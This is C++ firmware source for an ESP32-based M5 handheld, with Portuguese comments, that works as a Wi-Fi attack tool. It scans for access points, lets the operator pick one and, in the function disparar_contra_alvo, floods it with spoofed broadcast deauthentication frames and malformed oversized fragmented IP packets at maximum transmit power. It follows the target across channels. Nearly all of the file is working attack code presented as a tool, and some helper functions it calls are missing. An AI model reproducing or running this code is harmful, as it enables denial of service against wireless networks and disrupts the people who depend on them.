#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

// -------------------------------------------------------------------
// 1. ESTRUTURAS DE ATAQUE (Layer 2 e Layer 3)
// -------------------------------------------------------------------
struct __attribute__((packed)) DeauthPacket {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];
    uint8_t  mac_src[6];
    uint8_t  mac_bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
};

struct __attribute__((packed)) MacHeader {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];   
    uint8_t  mac_src[6];    
    uint8_t  mac_bssid[6];  
    uint16_t seq_ctrl;
};

struct __attribute__((packed)) IpHeader {
    uint8_t  version_ihl;   
    uint8_t  tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t frag_off;      
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint8_t  ip_src[4];     
    uint8_t  ip_dest[4];    
};

struct __attribute__((packed)) SilverBulletPacket {
    MacHeader mac;
    IpHeader ip;
    uint8_t payload[32];    
};

// -------------------------------------------------------------------
// 2. VARIÁVEIS GLOBAIS
// -------------------------------------------------------------------
#define MAX_ALVOS 10
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

volatile uint8_t canal_atual_alvo = 0;
volatile int8_t rssi_alvo = 0;
volatile bool alvo_perdido = false;

enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
EstadoFerramenta estado_atual = ESTADO_ESCANEAR;

// -------------------------------------------------------------------
// 3. MONITORIZAÇÃO INTELIGENTE (Core 1)
// -------------------------------------------------------------------
void task_monitoramento(void *pvParameters) {
    while (true) {
        if (estado_atual == ESTADO_ATIRAR) {
            uint8_t* bssid = alvos_encontrados[alvo_selecionado].bssid;
            wifi_scan_config_t scan_config = { .ssid = 0, .bssid = bssid, .channel = canal_atual_alvo, .show_hidden = true };
            
            esp_wifi_scan_start(&scan_config, true);
            uint16_t ap_count = 1;
            wifi_ap_record_t temp_record;
            esp_wifi_scan_get_ap_records(&ap_count, &temp_record);
            
            if (ap_count > 0) {
                rssi_alvo = temp_record.rssi;
                alvo_perdido = false;
            } else {
                alvo_perdido = true;
                for (int ch = 1; ch <= 13; ch++) {
                    scan_config.channel = ch;
                    esp_wifi_scan_start(&scan_config, true);
                    ap_count = 1;
                    esp_wifi_scan_get_ap_records(&ap_count, &temp_record);
                    if (ap_count > 0) {
                        canal_atual_alvo = ch;
                        rssi_alvo = temp_record.rssi;
                        alvo_perdido = false;
                        break;
                    }
                }
            }
        }
        vTaskDelay(2000 / portTICK_PERIOD_MS); 
    }
}

// -------------------------------------------------------------------
// 4. MOTOR DE ATAQUE HÍBRIDO (Core 0)
// -------------------------------------------------------------------
void disparar_contra_alvo() {
    SilverBulletPacket pkt;
    DeauthPacket deauth;
    memset(&pkt, 0, sizeof(SilverBulletPacket));
    memset(&deauth, 0, sizeof(DeauthPacket));
    
    canal_atual_alvo = alvos_encontrados[alvo_selecionado].primary;
    uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
    
    deauth.frame_control = 0x00C0; 
    memcpy(deauth.mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6); 
    memcpy(deauth.mac_src, mac_alvo, 6);
    memcpy(deauth.mac_bssid, mac_alvo, 6);
    deauth.reason_code = 0x0001;

    pkt.mac.frame_control = 0x0008; 
    memcpy(pkt.mac.mac_dest, mac_alvo, 6);
    memcpy(pkt.mac.mac_bssid, mac_alvo, 6);
    pkt.ip.version_ihl = 0x45; 
    pkt.ip.total_length = htons(0xFFFF); 
    pkt.ip.frag_off = htons(0x2000); 
    pkt.ip.protocol = 17;

    esp_wifi_set_max_tx_power(80); 

    while (true) {
        M5.update();
        if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;

        if (!alvo_perdido) {
            esp_wifi_set_channel(canal_atual_alvo, WIFI_SECOND_CHAN_NONE);
            
            for(int j=0; j<5; j++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(DeauthPacket), false);

            for (int i = 0; i < 60; i++) {
                pkt.ip.id = (uint16_t)esp_random(); 
                esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(SilverBulletPacket), false);
            }
            
            M5.Display.setCursor(0, 0);
            M5.Display.setTextColor(TFT_RED, TFT_BLACK);
            M5.Display.printf("ATAQUE HIBRIDO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
            M5.Display.printf("CH: %d | RSSI: %d dBm | BAT: %.2fV\n", canal_atual_alvo, rssi_alvo, M5.Power.getBatteryVoltage());
            
            int barra = map(rssi_alvo, -100, -20, 0, 240);
            M5.Display.fillRect(0, 40, barra, 8, (rssi_alvo > -65) ? TFT_GREEN : TFT_MAROON);
        }
        vTaskDelay(1 / portTICK_PERIOD_MS); 
    }
}

// -------------------------------------------------------------------
// 5. APP MAIN
// -------------------------------------------------------------------
extern "C" void app_main(void) {
    auto cfg = M5.config();
    M5.begin(cfg);
    M5.Display.setRotation(1);
    M5.Display.setTextSize(1.2);
    
    nvs_flash_init();
    esp_netif_init();
    esp_event_loop_create_default();
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1);

    escanear_redes();
    desenhar_menu();

    while (true) {
        M5.update();
        if (estado_atual == ESTADO_SELECIONAR) {
            if (M5.Keyboard.isKeyPressed(KEY_DOWN) && alvo_selecionado < total_alvos - 1) {
                alvo_selecionado++; desenhar_menu(); vTaskDelay(150 / portTICK_PERIOD_MS);
            }
            if (M5.Keyboard.isKeyPressed(KEY_UP) && alvo_selecionado > 0) {
                alvo_selecionado--; desenhar_menu(); vTaskDelay(150 / portTICK_PERIOD_MS);
            }
            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
                estado_atual = ESTADO_ATIRAR;
                esp_wifi_set_promiscuous(true);
                disparar_contra_alvo();
                esp_wifi_set_promiscuous(false);
                estado_atual = ESTADO_SELECIONAR;
                desenhar_menu();
            }
        }
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
}